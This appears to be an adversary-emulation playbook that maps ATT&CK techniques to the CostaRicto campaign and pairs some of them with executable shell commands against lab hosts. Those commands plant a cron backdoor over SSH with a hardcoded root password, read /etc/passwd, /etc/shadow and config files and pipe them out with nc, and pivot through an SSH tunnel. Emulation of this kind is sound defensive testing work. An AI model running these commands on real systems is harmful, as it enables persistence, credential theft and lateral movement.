name: T1046 - Network Service Discovery
description: During CostaRicto, the threat actors employed nmap and pscan to scan target environments.

name: T1105 - Ingress Tool Transfer
description: During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.

name: T1090.003 - Multi-hop Proxy
description: During CostaRicto, the threat actors used a layer of proxies to manage C2 communications.

name: T1053.005 - Scheduled Task
description: During CostaRicto, the threat actors used scheduled tasks to download backdoor tools.

executors.name: sh
executors.command: sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'

name: T1588.002 - Tool
description: During CostaRicto, the threat actors obtained open source tools to use in their operations.

name: T1133 - External Remote Services
description: During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.

name: T1583.001 - Domains
description: For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.

name: T1587.001 - Malware
description: For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.

name: T1005 - Data from Local System
description: During CostaRicto, the threat actors collected data and files from compromised networks.

executors.name: sh
executors.command: curl http://172.21.0.20:4444/ -s -o /tmp/resp; echo 'cat /etc/passwd' | nc -w 2 172.21.0.20 4545; echo 'cat /etc/shadow' | nc -w 2 172.21.0.20 4444; echo 'find / -type f -name "*.conf" -exec cat {} \;' | nc -w 2 172.21.0.20 4444

name: T1572 - Protocol Tunneling
description: During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.

executors.name: sh
executors.command: fuser -k 2222/tcp 2>/dev/null; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -L 2222:172.22.0.20:22 root@172.21.0.20 -N & TUNNEL_PID=$!; sleep 5; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p 2222 id; kill $TUNNEL_PID
